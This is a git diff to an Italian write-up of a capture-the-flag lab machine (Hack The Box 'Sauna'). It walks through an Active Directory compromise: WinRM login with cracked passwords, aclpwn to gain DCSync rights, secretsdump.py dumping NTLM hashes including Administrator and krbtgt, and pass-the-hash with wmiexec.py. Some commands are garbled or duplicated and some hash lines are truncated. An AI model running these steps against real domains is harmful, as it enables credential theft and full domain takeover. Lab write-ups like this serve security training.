@@ -64,6 +64,9 @@ Rompo l'hash con john:
 Thestrokes23
 ```
 
+## Exploiting
+
+
 Quindi mi collego alla macchina con:
 ```
 evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175
@@ -89,4 +92,41 @@ Lancio il comando per collegarmi:
 sudo evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175
 ```
 
-E potroò così runnare SharpHound.exe
+E potrò così runnare SharpHound.exe
+
+## Priv Esc
+
+Eseguito SharpHound dal Service User Account, ho mandato in locale il file .zip generato, quindi dato in pasto a Bloodhound.
+
+Ho cercato un possibile path da svc_loanmgr a domain_admins ma non ho trovato nulla... Quindi eseguo:
+
+```
+aclpwn -f svc_loanmgr@EGOTISTICAL-BANK.LOCAL -ft User -t EGOTISTICAL-BANK.LOCAL -d EGOTISTICAL-BANK.LOCAL -du neo4j -dp PWD -s 10.10.10.175 -u svc_loanmgr -sp Moneymakestheworldgoround!
+
+```
+
+E vedo che, come nel caso di Forest, l'exploit mi darà permessi di DCSync. Quindi avrò l'autorizzazione per richiedere copie NTLM delle password. Ne faccio il dump con:
+
+```
+secretsdump.py -just-dc-ntlm Estheworldgoround\!@10.10.10.175
+aclpwn -f svc_loanmgr@EGOTISTICAL-BANK.LOCAL -ft User -t EGOTISTICAL-BANK.LOCAL -d EGOTISTICAL-BANK.LOCAL -du neo4j -dp PWD -s 10.10.10.175 -u svc_loanmgr -sp Moneymakestheworldgoround!
+```
+Ed ottengo:
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201d
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201d
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:8d0ab9c7d67fa60289bead42d13440b1:::
+```
+
+Quindi accedo alla macchina con utenza Administrator con tecnica PTH:
+```
+wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff Administrator@10.10.10.175
+```
+
+Navigo dentro il Desktop ed eccolo lì il root.txt 😍
+
+PS. Ricordati per le prossime volte di lanciare wmiexec.py da impacket/examples/python wmi.....
